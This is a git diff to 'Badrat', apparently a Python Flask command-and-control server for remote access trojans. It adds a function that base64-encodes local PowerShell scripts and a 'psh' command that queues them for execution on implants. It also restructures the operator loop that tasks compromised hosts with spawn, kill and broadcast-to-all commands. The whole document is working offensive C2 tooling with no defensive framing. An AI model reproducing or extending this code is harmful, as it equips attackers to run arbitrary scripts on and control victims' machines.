@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 from flask import Flask, request
 from datetime import datetime
+from pathlib import Path
 import threading
 import argparse
 import readline
@@ -82,7 +83,11 @@ def colors(value):
         else:
             return(BOLD + py + value + ENDC)
     except:
-        return(UNDERLINE + value + ENDC)
+        if(len(value) > 100):
+            return(UNDERLINE + value[0:96] + c + "..." + ENDC)
+        else:
+            return(UNDERLINE + value + ENDC)
+
 
 # Page sent to "unauthorized" users of the http listener
 def default_page():
@@ -98,8 +103,14 @@ def send_ratcode(ratID):
             return(ratcode)
         else:
             ratcode = base64.b64encode(ratcode.encode('utf-8')).decode('utf-8')
-            print("Returing ratcode: "+ratcode)
             return(ratcode)
+
+def get_psscript(filepath):
+   with open(Path(filepath).resolve() , "r") as fd:
+       content = fd.read()
+       content = base64.b64encode(content.encode('utf-8')).decode('utf-8')
+       print("[*] Sending contents of " + filepath)
+       return(content)
 
 def serve_server(port=8080):
     app = Flask(__name__)
@@ -224,7 +235,7 @@ if __name__ == "__main__":
         print("\n[!] Could not start listener!")
         sys.exit()
 
-    # Main menu
+    # Badrat main menu loop
     while True:
         inp = input(UNDERLINE + "Badrat" + ENDC + " //> ")
 
@@ -255,28 +266,48 @@ if __name__ == "__main__":
         # Enter rat specific command prompt
         elif(inp in rats.keys() or inp == "all"):
             ratID = inp
+
+            # Interact-with-rat loop
             while True:
                 inp = input(colors(ratID) + " \\\\> ")
-                if(inp == "back" or inp == "exit"):
-                    break
-                elif(inp == "agents" or inp == "rats" or inp == "checkins" or inp == "sessions"):
-                    get_rats(ratID)
-                elif(inp == "clear"):
-                    os.system("clear")
-                elif(inp):
-                    if(inp == "quit" or inp == "kill_rat"):
-                        print("[*] Tasked " + colors(ratID) + " to " + colors("commit Seppuku"))
+
+                if(inp != ""):
+
+                    if(inp == "back" or inp == "exit"):
+                        break
+
+                    elif(inp == "agents" or inp == "rats" or inp == "implantss" or inp == "sessions"):
+                        get_rats(ratID)
+                        continue
+
+                    elif(inp == "clear"):
+                        os.system("clear")
+
+                    elif(inp == "quit" or inp == "kill_rat"):
                         inp = "quit"
+
                     elif(inp == "spawn"):
                         if(types[ratID] == "hta"):
                             inp = "spawn"
                         else:
                             inp = "spawn " + send_ratcode(ratID)
-                    else:
-                        print("[*] Queued command " + colors(inp) + " for " + colors(ratID))
 
+                    elif(str.startswith(inp, "psh ")):
+                        try:
+                            filepath = inp.split(" ")[1]
+                            script = get_psscript(filepath)
+                            if(types[ratID] == "ps1"):
+                                inp = "psh " + script
+                            else:
+                                inp = "echo sending msbuild package"
+                        except:
+                            print("[!] Could not open file " + filepath + " for reading")
+                            continue
+
+
+                    print("[*] Queued command " + colors(inp) + " for " + colors(ratID))
                     if(ratID == "all"):
-                        # update ALL commands
+                    # update ALL commands
                         for i in commands.keys():
                             commands[i] = inp
                     else:
